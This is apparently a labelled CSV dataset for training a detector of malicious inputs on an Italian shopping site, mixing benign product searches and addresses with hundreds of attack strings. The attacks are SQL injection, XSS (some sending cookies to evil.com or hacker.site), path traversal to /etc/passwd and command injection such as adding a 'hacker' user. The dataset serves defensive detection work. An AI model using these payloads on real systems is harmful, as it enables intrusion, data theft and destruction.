testo,etichetta
cerco giacca verde taglia S,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
cerco maglietta nero taglia XL,0
<script>alert(document.cookie)</script>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
cerco zaino blu taglia M,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<script>fetch('http://hacker.site')</script>,1
../../../etc/passwd,1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
<script>alert(document.cookie)</script>,1
../../../../etc/passwd,1
../../../../etc/passwd,1
compra felpa online in offerta,0
1' OR 'a'='a' UNION SELECT * FROM utenti --,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
'; DROP TABLE sessions; --,1
'; DROP TABLE config; --,1
"Via Dante 72, Bologna",0
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
../../../../../../../etc/passwd,1
1' OR 'a'='a' UNION SELECT * FROM sessions --,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
cerco zaino grigio taglia 44,0
<script>fetch('http://hacker.site')</script>,1
cerco zaino blu taglia S,0
compra maglietta online in offerta,0
../../../../../../etc/passwd,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
../../../../../../etc/passwd,1
<script>alert('pwned')</script>,1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
1' OR 'a'='a' UNION SELECT * FROM sessions --,1
"<svg onload=""fetch('http://hacker.site')"">",1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
'; DROP TABLE clienti; --,1
"<svg onload=""fetch('http://hacker.site')"">",1
'; DROP TABLE config; --,1
'; DROP TABLE clienti; --,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
"<svg onload=""alert('pwned')"">",1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
"<svg onload=""alert(document.cookie)"">",1
..%2f%2f%2f%2fvar/www/html/config.php,1
<script>fetch('http://hacker.site')</script>,1
'; DROP TABLE utenti; --,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
../../../../../../../etc/passwd,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
..%2f%2f%2f%2fvar/www/html/config.php,1
<script>alert(document.cookie)</script>,1
..%2f%2f%2f%2fvar/www/html/config.php,1
<script>alert(document.cookie)</script>,1
'; DROP TABLE carte_credito; --,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
"<svg onload=""alert(document.cookie)"">",1
"<svg onload=""fetch('http://hacker.site')"">",1
compra pantaloni online in offerta,0
../../../../etc/passwd,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
compra pantaloni online in offerta,0
<script>alert('pwned')</script>,1
cerco giacca rosso taglia 43,0
cerco scarpe grigio taglia M,0
cerco giacca bianco taglia 44,0
"<svg onload=""alert(document.cookie)"">",1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<script>alert(document.cookie)</script>,1
<script>alert('pwned')</script>,1
../../../../../../../etc/passwd,1
'; DROP TABLE admin; --,1
compra maglietta online in offerta,0
"<svg onload=""alert('pwned')"">",1
"Via Garibaldi 12, Firenze",0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
compra pantaloni online in offerta,0
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
"<svg onload=""fetch('http://hacker.site')"">",1
<script>fetch('http://hacker.site')</script>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
1' OR 'a'='a' UNION SELECT * FROM admin --,1
"<svg onload=""alert('pwned')"">",1
"<svg onload=""fetch('http://hacker.site')"">",1
../../../../etc/passwd,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
"Via Milano 63, Milano",0
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
cerco pantaloni bianco taglia 43,0
"Via Mazzini 12, Roma",0
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
maglietta nike nera XL,0
<script>alert(document.cookie)</script>,1
../../../../etc/passwd,1
'; DROP TABLE admin; --,1
"Via Milano 122, Bologna",0
../../../../etc/passwd,1
..%2f%2f%2fvar/www/html/config.php,1
'; DROP TABLE config; --,1
<script>alert(document.cookie)</script>,1
'; DROP TABLE clienti; --,1
../../../../../../../../etc/passwd,1
../../../etc/passwd,1
cerco pantaloni verde taglia M,0
../../../../../../../../etc/passwd,1
cerco maglietta bianco taglia 44,0
compra scarpe online in offerta,0
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
<script>alert(document.cookie)</script>,1
<script>fetch('http://hacker.site')</script>,1
cerco zaino blu taglia 42,0
<script>fetch('http://hacker.site')</script>,1
compra zaino online in offerta,0
'; DROP TABLE carte_credito; --,1
..\..\..\..\boot.ini,1
compra felpa online in offerta,0
cerco felpa verde taglia XL,0
compra orologio online in offerta,0
"<svg onload=""fetch('http://hacker.site')"">",1
"<svg onload=""alert(document.cookie)"">",1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
"<svg onload=""fetch('http://hacker.site')"">",1
<script>fetch('http://hacker.site')</script>,1
'; DROP TABLE sessions; --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
"<svg onload=""alert('pwned')"">",1
../../../../../../etc/passwd,1
../../../../../../etc/passwd,1
../../../etc/passwd,1
../../../../etc/passwd,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<script>alert('pwned')</script>,1
..%2f%2f%2fvar/www/html/config.php,1
"<svg onload=""alert('pwned')"">",1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
'; DROP TABLE sessions; --,1
<script>fetch('http://hacker.site')</script>,1
1' OR 'a'='a' UNION SELECT * FROM utenti --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
../../../../etc/passwd,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
<script>alert(document.cookie)</script>,1
1' OR 'a'='a' UNION SELECT * FROM admin --,1
cerco felpa verde taglia S,0
"Via Garibaldi 119, Genova",0
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
"Via Mazzini 9, Napoli",0
"<svg onload=""alert('pwned')"">",1
"Via Mazzini 245, Palermo",0
cerco felpa blu taglia 43,0
../../../etc/passwd,1
..%2f%2f%2f%2fvar/www/html/config.php,1
cuffie wireless bluetooth,0
'; DROP TABLE clienti; --,1
<script>alert(document.cookie)</script>,1
1' OR 'a'='a' UNION SELECT * FROM sessions --,1
'; DROP TABLE clienti; --,1
cerco maglietta blu taglia XL,0
"Via Dante 96, Firenze",0
'; DROP TABLE sessions; --,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
<script>fetch('http://hacker.site')</script>,1
"<svg onload=""alert(document.cookie)"">",1
../../../etc/passwd,1
borsa a tracolla in pelle,0
compra pantaloni online in offerta,0
<script>fetch('http://hacker.site')</script>,1
compra orologio online in offerta,0
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
tappetino yoga antiscivolo,0
../../../etc/passwd,1
'; DROP TABLE utenti; --,1
1' OR 'a'='a' UNION SELECT * FROM config --,1
<script>fetch('http://hacker.site')</script>,1
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
"Via Milano 89, Napoli",0
agenda 2026 giornaliera,0
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
<script>alert('pwned')</script>,1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
'; DROP TABLE config; --,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
../../../../../../etc/passwd,1
1' OR 'a'='a' UNION SELECT * FROM admin --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
compra orologio online in offerta,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"<svg onload=""fetch('http://hacker.site')"">",1
"Via Dante 100, Milano",0
<script>alert('pwned')</script>,1
"Via Mazzini 148, Bologna",0
'; DROP TABLE utenti; --,1
"<svg onload=""fetch('http://hacker.site')"">",1
1' OR 'a'='a' UNION SELECT * FROM config --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
../../../etc/passwd,1
$(whoami),1
"<svg onload=""alert('pwned')"">",1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
cerco felpa verde taglia 41,0
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
'; DROP TABLE clienti; --,1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
../../../../../../../etc/passwd,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
../../../etc/passwd,1
cerco maglietta grigio taglia L,0
1' OR 'a'='a' UNION SELECT * FROM config --,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
cerco zaino grigio taglia S,0
1' OR 'a'='a' UNION SELECT * FROM config --,1
<script>alert(document.cookie)</script>,1
../../../../../../etc/passwd,1
cerco giacca giallo taglia M,0
"<svg onload=""alert('pwned')"">",1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
compra zaino online in offerta,0
../../../../etc/passwd,1
'; DROP TABLE config; --,1
../../../../../../../etc/passwd,1
compra pantaloni online in offerta,0
../../../etc/passwd,1
1' OR 'a'='a' UNION SELECT * FROM sessions --,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
1' OR 'a'='a' UNION SELECT * FROM config --,1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
"Via Dante 91, Firenze",0
..%2f%2f%2f%2fvar/www/html/config.php,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
"Via Milano 61, Genova",0
"Via Milano 63, Palermo",0
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
'; DROP TABLE admin; --,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
puzzle 1000 pezzi paesaggio,0
cerco orologio rosso taglia 43,0
"<svg onload=""fetch('http://hacker.site')"">",1
..%2f%2f%2f%2fvar/www/html/config.php,1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
'; DROP TABLE clienti; --,1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
"<svg onload=""alert(document.cookie)"">",1
<script>alert('pwned')</script>,1
cerco pantaloni giallo taglia 41,0
admin' --,1
'; DROP TABLE clienti; --,1
../../../../../etc/passwd,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1' OR 'a'='a' UNION SELECT * FROM config --,1
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
<script>fetch('http://hacker.site')</script>,1
../../../../../../../../etc/passwd,1
"1' AND 1=2 UNION SELECT accounts, passwords FROM secrets --",1
'; DROP TABLE clienti; --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<script>alert('pwned')</script>,1
1' OR 'a'='a' UNION SELECT * FROM admin --,1
../../../../../../etc/passwd,1
../../../../../etc/passwd,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
cerco felpa grigio taglia M,0
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
cerco orologio grigio taglia S,0
"Via Mazzini 206, Roma",0
"<svg onload=""fetch('http://hacker.site')"">",1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
../../../../etc/passwd,1
..%2f%2f%2fvar/www/html/config.php,1
'; DROP TABLE carte_credito; --,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
"<svg onload=""alert('pwned')"">",1
../../../../../etc/passwd,1
1' OR 'a'='a' UNION SELECT * FROM config --,1
..%2f%2f%2fvar/www/html/config.php,1
../../../../etc/passwd,1
compra pantaloni online in offerta,0
"Via Milano 127, Roma",0
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
"<svg onload=""alert('pwned')"">",1
"Via Garibaldi 109, Firenze",0
reso gratuito entro 30 giorni,0
"<svg onload=""fetch('http://hacker.site')"">",1
..%2f%2f%2f%2fvar/www/html/config.php,1
cerco zaino nero taglia 42,0
cerco felpa giallo taglia 42,0
"<svg onload=""fetch('http://hacker.site')"">",1
"<svg onload=""alert(document.cookie)"">",1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
compra pantaloni online in offerta,0
"<svg onload=""fetch('http://hacker.site')"">",1
"<svg onload=""alert(document.cookie)"">",1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
cerco pantaloni rosso taglia M,0
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
1' OR 'a'='a' UNION SELECT * FROM config --,1
<script>alert(document.cookie)</script>,1
cerco scarpe bianco taglia S,0
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
../../../../etc/passwd,1
cerco giacca giallo taglia 41,0
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
cerco orologio grigio taglia S,0
'; DROP TABLE utenti; --,1
"Via Dante 185, Palermo",0
'; DROP TABLE sessions; --,1
"Corso Italia 1, Roma",0
<script>alert('pwned')</script>,1
..%2f%2f%2f%2fvar/www/html/config.php,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
<script>fetch('http://hacker.site')</script>,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
"Via Mazzini 108, Palermo",0
"Via Garibaldi 217, Torino",0
1' OR 'a'='a' UNION SELECT * FROM config --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"Via Mazzini 11, Genova",0
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
'; DROP TABLE utenti; --,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
cerco giacca grigio taglia 44,0
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
1' OR 'a'='a' UNION SELECT * FROM sessions --,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
';alert(1)//,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
cerco maglietta giallo taglia 41,0
cerco pantaloni giallo taglia 42,0
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
"Via Dante 105, Napoli",0
<script>document.location='http://evil.com/steal?c='+document.cookie</script>,1
..%2f%2f%2fvar/www/html/config.php,1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
"<svg onload=""alert('pwned')"">",1
"<svg onload=""alert(document.cookie)"">",1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
"Via Mazzini 105, Milano",0
"Corso Italia 34, Bologna",0
../../../../etc/passwd,1
compra pantaloni online in offerta,0
cerco felpa rosso taglia XL,0
"Via Roma 44, Torino",0
"Via Mazzini 105, Napoli",0
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
../../../../../../etc/passwd,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
../../../../../etc/passwd,1
"<svg onload=""alert('pwned')"">",1
compra maglietta online in offerta,0
cerco pantaloni grigio taglia 43,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<script>alert('pwned')</script>,1
"Via Mazzini 69, Torino",0
"Via Roma 69, Firenze",0
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
'; DROP TABLE admin; --,1
<script>fetch('http://hacker.site')</script>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
..%2f%2f%2f%2fvar/www/html/config.php,1
../../../../../../etc/passwd,1
..%2f%2f%2fvar/www/html/config.php,1
"<svg onload=""alert('pwned')"">",1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
"<svg onload=""alert('pwned')"">",1
../../../../../../../../etc/passwd,1
..%2f%2f%2f%2fvar/www/html/config.php,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
'; DROP TABLE carte_credito; --,1
"Via Milano 28, Firenze",0
"Via Mazzini 136, Torino",0
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
"<svg onload=""fetch('http://hacker.site')"">",1
<script>alert(document.cookie)</script>,1
<script>fetch('http://hacker.site')</script>,1
'; DROP TABLE sessions; --,1
<script>alert('pwned')</script>,1
"<svg onload=""alert('pwned')"">",1
'; DROP TABLE config; --,1
..%2f%2f%2f%2fvar/www/html/config.php,1
..%2f%2f%2f%2fvar/www/html/config.php,1
1' OR 'a'='a' UNION SELECT * FROM config --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1' OR 'a'='a' UNION SELECT * FROM config --,1
..%2f%2f%2fvar/www/html/config.php,1
cerco orologio verde taglia L,0
<script src='http://evil.com/auth.js'></script>,1
..%2f%2f%2fvar/www/html/config.php,1
'; DROP TABLE carte_credito; --,1
"<svg onload=""alert('pwned')"">",1
"<svg onload=""alert('pwned')"">",1
compra giacca online in offerta,0
"Via Milano 224, Firenze",0
1' OR 'a'='a' UNION SELECT * FROM admin --,1
1' OR 'a'='a' UNION SELECT * FROM config --,1
'; DROP TABLE carte_credito; --,1
<script>alert(document.cookie)</script>,1
<script>alert(document.cookie)</script>,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
; net user hacker pass123 /add,1
'; DROP TABLE carte_credito; --,1
"Via Milano 198, Bologna",0
compra pantaloni online in offerta,0
<script>fetch('http://hacker.site')</script>,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
'; DROP TABLE sessions; --,1
compra scarpe online in offerta,0
'; DROP TABLE admin; --,1
"Via Dante 81, Bologna",0
..%2f%2f%2fvar/www/html/config.php,1
../../../../../../../../etc/passwd,1
..%2f%2f%2f%2fvar/www/html/config.php,1
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
../../../../../../../etc/passwd,1
compra scarpe online in offerta,0
"Via Dante 216, Palermo",0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
libro romanzo bestseller,0
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
'; DROP TABLE clienti; --,1
<script>alert('pwned')</script>,1
<script>alert('pwned')</script>,1
<script>alert('pwned')</script>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"<svg onload=""fetch('http://hacker.site')"">",1
compra zaino online in offerta,0
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
"Via Milano 119, Roma",0
"<svg onload=""alert(document.cookie)"">",1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
'; DROP TABLE carte_credito; --,1
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
<script>alert('pwned')</script>,1
power bank 10000mah,0
..%2f%2f%2fvar/www/html/config.php,1
'; DROP TABLE clienti; --,1
..%2f%2f%2f%2fvar/www/html/config.php,1
aggiungi al carrello,0
<script>alert('pwned')</script>,1
"Corso Italia 162, Palermo",0
../../../../etc/passwd,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"Via Milano 67, Torino",0
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
"<svg onload=""alert(document.cookie)"">",1
../../../../../../../etc/passwd,1
..%2f%2f%2fvar/www/html/config.php,1
<script>alert(document.cookie)</script>,1
"Via Milano 202, Roma",0
cerco giacca bianco taglia M,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
"<svg onload=""fetch('http://hacker.site')"">",1
compra felpa online in offerta,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
compra pantaloni online in offerta,0
compra pantaloni online in offerta,0
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
'; DROP TABLE carte_credito; --,1
"<svg onload=""alert(document.cookie)"">",1
<script>fetch('http://hacker.site')</script>,1
'; DROP TABLE clienti; --,1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
'; DROP TABLE clienti; --,1
'; DROP TABLE sessions; --,1
"Via Roma 15, Palermo",0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
1' OR 'a'='a' UNION SELECT * FROM utenti --,1
..%2f%2f%2fvar/www/html/config.php,1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
"Via Garibaldi 39, Milano",0
compra orologio online in offerta,0
<script>alert('XSS')</script>,1
'; DROP TABLE carte_credito; --,1
../../../../../etc/passwd,1
cerco maglietta grigio taglia M,0
1' OR 'a'='a' UNION SELECT * FROM sessions --,1
cerco felpa grigio taglia 43,0
..%2f%2f%2fvar/www/html/config.php,1
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
'; DROP TABLE admin; --,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
'; DROP TABLE carte_credito; --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
'; DROP TABLE sessions; --,1
"<svg onload=""alert(document.cookie)"">",1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
"Corso Italia 167, Bologna",0
"Via Mazzini 15, Palermo",0
cerco orologio rosso taglia XL,0
..%2f%2f%2f%2fvar/www/html/config.php,1
1' OR 'a'='a' UNION SELECT * FROM admin --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
contatta il supporto clienti,0
cerco zaino verde taglia S,0
"<svg onload=""fetch('http://hacker.site')"">",1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
..%2f%2f%2fvar/www/html/config.php,1
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1' OR 'a'='a' UNION SELECT * FROM utenti --,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
..%2f%2f%2f%2fvar/www/html/config.php,1
../../../etc/passwd,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
"<svg onload=""alert(document.cookie)"">",1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
"<svg onload=""fetch('http://hacker.site')"">",1
compra orologio online in offerta,0
cerco pantaloni bianco taglia M,0
..%2f%2f%2fvar/www/html/config.php,1
miele di castagno naturale,0
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
"<svg onload=""alert(document.cookie)"">",1
'; DROP TABLE utenti; --,1
cerco scarpe verde taglia 42,0
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
../../../../../../../../etc/passwd,1
compra scarpe online in offerta,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"Via Mazzini 220, Napoli",0
../../../../../../etc/passwd,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
cerco felpa grigio taglia 41,0
cerco scarpe verde taglia L,0
../../../../../../etc/passwd,1
"Via Dante 126, Torino",0
"Via Roma 159, Roma",0
../../../../../etc/passwd,1
'; DROP TABLE carte_credito; --,1
'; DROP TABLE config; --,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
"<svg onload=""alert('pwned')"">",1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
compra giacca online in offerta,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
..%2f%2f%2f%2fvar/www/html/config.php,1
..%2f%2f%2fvar/www/html/config.php,1
"Via Garibaldi 49, Genova",0
../../../../../../../../etc/passwd,1
<script>fetch('http://hacker.site')</script>,1
1' OR 'a'='a' UNION SELECT * FROM sessions --,1
compra orologio online in offerta,0
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
'; DROP TABLE admin; --,1
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
..%2f%2f%2f%2fvar/www/html/config.php,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
../../../../../../../etc/passwd,1
"Via Roma 241, Genova",0
"Via Milano 84, Milano",0
"' UNION SELECT null, username, password FROM users --",1
../../../../../../etc/passwd,1
1' OR 'a'='a' UNION SELECT * FROM sessions --,1
1; DROP TABLE users,1
"<svg onload=""fetch('http://hacker.site')"">",1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
../../../../../../../etc/passwd,1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"<svg onload=""fetch('http://hacker.site')"">",1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
cerco giacca rosso taglia 44,0
compra zaino online in offerta,0
'; DROP TABLE clienti; --,1
'; DROP TABLE admin; --,1
<script>alert('pwned')</script>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"<svg onload=""fetch('http://hacker.site')"">",1
1' OR 'a'='a' UNION SELECT * FROM admin --,1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
"Via Garibaldi 29, Roma",0
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
"<svg onload=""fetch('http://hacker.site')"">",1
cerco zaino grigio taglia M,0
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
"<svg onload=""alert(document.cookie)"">",1
'; DROP TABLE clienti; --,1
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
compra maglietta online in offerta,0
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
'; DROP TABLE clienti; --,1
..%2f%2f%2f%2fvar/www/html/config.php,1
compra felpa online in offerta,0
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
"<svg onload=""alert('pwned')"">",1
..%2f%2f%2f%2fvar/www/html/config.php,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
"<svg onload=""fetch('http://hacker.site')"">",1
../../../../etc/passwd,1
<script>fetch('http://hacker.site')</script>,1
1' OR 'a'='a' UNION SELECT * FROM sessions --,1
"<svg onload=""fetch('http://hacker.site')"">",1
"<svg onload=""alert(document.cookie)"">",1
